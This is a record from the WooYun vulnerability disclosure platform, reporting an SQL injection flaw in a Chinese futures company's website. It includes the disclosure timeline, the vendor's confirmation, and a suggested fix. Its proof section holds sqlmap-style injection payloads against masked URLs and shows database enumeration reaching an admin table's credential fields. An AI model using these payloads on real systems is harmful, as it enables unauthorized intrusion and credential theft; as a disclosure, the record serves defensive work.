{"id": 82183, "wybug_id": "wooyun-2015-0151821", "wybug_title": "中钢期货存在sql注入漏洞", "wybug_corp": "中钢期货有限公司", "wybug_author": "Nelion", "wybug_date": "2015-11-05 13:22", "wybug_open_date": "2015-12-24 11:12", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注入"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-11-05：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-11-09：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-11-19：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-11-29：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-12-09：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-12-24：\t细节向公众公开  简要描述： RT 详细说明：  1、中钢期货：（百度百科）中钢期货有限公司控股股东中国中钢集团公司资本雄厚，是我国钢铁行业最具实力的经贸企业集团，属国资委管理的中央大型企业集团。中钢集团拥有覆盖全球的营销网络和物流服务系统，是中国主要钢铁生产企业的原料供应商和产品代理商，与国内外多家企业建立了长期战略合作关系。经过十多年的发展，中钢集团凝聚了强大的前进动力。展望未来，中钢集团将充分发挥已有优势，努力构建以专业公司为主体，科技实业为支撑，地区网络为辅助，海外机构为平台，行业领先，主业突出，管理一流，具有全球化运作体系和创新能力的大型跨国企业集团。中钢期货有限公司网站存在SQL注入漏洞，注入点挺多的，但主要是（idl和ss）这两个参数存在问题。2、注入点：http://**.**.**.**/zhonggang/wokaoqu.aspx?ss=170http://**.**.**.**/zhonggang/TeBieZhuanLan4.aspx?id=227&idl=0 （idl参数）   漏洞证明：  3、查看所有库（以http://**.**.**.**/zhonggang/TeBieZhuanLan4.aspx?id=227&idl=0为例）：Parameter: idl (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: id=227&idl=0' AND 9742=9742 AND 'CFUY'='CFUY    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: id=227&idl=0' AND 9467=CONVERT(INT,(SELECT CHAR(113)+CHAR(98)+CHAR(118)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (9467=9467) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(107)+CHAR(112)+CHAR(113)+CHAR(113))) AND 'iMTk'='iMTk    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries (comment)    Payload: id=227&idl=0';WAITFOR DELAY '0:0:5'--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind (comment)    Payload: id=227&idl=0' WAITFOR DELAY '0:0:5'-----[17:04:02] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2008 R2 or 7web application technology: ASP.NET 4.0.30319, Microsoft IIS 7.5, ASP.NETback-end DBMS: Microsoft SQL Server 2008--------------available databases [3]:[*] hds0750164_db[*] master[*] tempdb3、当前库是hds0750164_db，那就看一下这个库的表：\n\n4、再看一下iCompany_Admin这个表中的字段：\n\n5、我们再看一下字段AdminEmail，AdminPassword的数据：\n\n6、其他的就不再看了吧，列了这些应该能说明该漏洞了吧。   修复方案：  参数过滤   版权声明：转载请注明来源 Nelion@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2015-11-09 11:10 厂商回复： CNVD确认并复现所述情况，已经转由CNCERT向能源行业信息化主管部门通报，由其后续协调网站管理单位处置。  最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}